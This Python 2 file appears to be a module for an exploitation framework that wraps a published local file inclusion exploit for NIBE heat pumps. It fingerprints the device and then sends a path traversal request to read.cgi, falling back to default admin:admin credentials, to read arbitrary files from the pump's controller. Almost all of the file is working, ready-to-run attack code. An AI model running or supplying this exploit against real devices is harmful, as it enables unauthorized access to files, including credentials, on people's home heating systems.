import time

def about():
	print '''!/usr/bin/python
NIBE heat pump LFI exploit

Written by Jelmer de Hen
Published at http://h.ackack.net/?p=302

Special thanks to Fredrik Nordberg Almroth and Mathias Karlsson for obtaining this information http://h.ackack.net/?p=274 which made me test the heat pumps and find the exploits.
	'''

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (HeatPump)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("HeatPump","Normal","Heat Pump LFI Exploit")
except:
	pass

def auto_info(name="",module="",plat="",priv="",lic="",rank="Normal",release="N/A",by="N/A"):
	print
	print "Publisher Information for HeatPump"
	print
	print "	   Name:","HeatPump"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class HeatPump(object):
	def start(self):
		#!/usr/bin/python
		import socket,sys,os,base64
		socket.setdefaulttimeout(TIMEOUT)
		# NIBE heat pump LFI exploit
		#
		# Written by Jelmer de Hen
		# Published at http://h.ackack.net/?p=302
		#
		# Special thanks to Fredrik Nordberg Almroth and Mathias Karlsson for obtaining this information http://h.ackack.net/?p=274 which made me test the heat pumps and find the exploits.
		
		
		def finger_heatpump(ip, port):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.send("GET / HTTP/1.1\n\n")
			header = s.recv(1024)
			s.close()
			if header.find("NIBE") !=-1:
				return 1
			else:
				return 0
		
		def exploit_pump(ip, port, filename, basic_auth):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.send("GET /cgi-bin/read.cgi?page=../.."+filename+" HTTP/1.1\nAuthorization: Basic "+basic_auth+"\n\n")
			file = ""
			while s.recv(1024):
				file = file + s.recv(1024)
			s.close()
			return file
		
		def main():
			if True:
				try:
					ip = raw_input("IP: ")
					port = input("Port: ")
					filename = raw_input("File: ")
				except:
					print "[-] Error\n"
				try:
					basic_auth = base64.b64encode(raw_input("Username: ")+":"+raw_input("Password: "))
				except:
					basic_auth = base64.b64encode("admin:admin")
		
				if finger_heatpump(ip, port) == 1:
					print "[+] Fingerprint scan success"
					file_contents = exploit_pump(ip, port, filename, basic_auth)
					if len(file_contents)==0:
						print "[-] The exploit failed, you can retry the exploit or the username and/or password are not right"
					else:
						print "[+] Contents of "+filename+":"
						print file_contents
				else:
					print "[-] Fingerprint scan failed"
		
			else:
				instructions()
		main()

try:
	TIMEOUT
except:
	TIMEOUT = 4

def show_opt():
	print
	print "Module Options (HeatPump)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	try:
		TIMEOUT
	except:
		TIMEOUT = 5
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	try:
		TIMEOUT
	except:
		TIMEOUT = 5
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"NIBE Heat Pump"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "proc":
		try:
			program = HeatPump()
			program.start()
		except Exception as e:
			print e
			print "Options Still Unset"
			time.sleep(0.3)
			show_opt()
except:
	pass
